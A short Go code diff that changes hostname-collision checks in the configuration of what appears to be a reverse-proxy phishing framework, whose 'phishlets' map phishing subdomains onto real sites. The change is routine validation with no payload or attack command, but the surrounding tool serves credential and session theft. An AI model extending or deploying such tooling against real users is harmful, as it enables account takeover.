@@ -576,17 +576,15 @@ func (c *Config) VerifyPhishlets() {
 			continue
 		}
 		for _, ph := range pl.proxyHosts {
-			if ph.is_landing || ph.handle_session {
-				phish_host := combineHost(ph.phish_subdomain, ph.domain)
-				orig_host := combineHost(ph.orig_subdomain, ph.domain)
-				if c_site, ok := hosts[phish_host]; ok {
-					log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
-				} else if c_site, ok := hosts[orig_host]; ok {
-					log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
-				}
-				hosts[phish_host] = site
-				hosts[orig_host] = site
+			phish_host := combineHost(ph.phish_subdomain, ph.domain)
+			orig_host := combineHost(ph.orig_subdomain, ph.domain)
+			if c_site, ok := hosts[phish_host]; ok {
+				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
+			} else if c_site, ok := hosts[orig_host]; ok {
+				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
 			}
+			hosts[phish_host] = site
+			hosts[orig_host] = site
 		}
 	}
 }
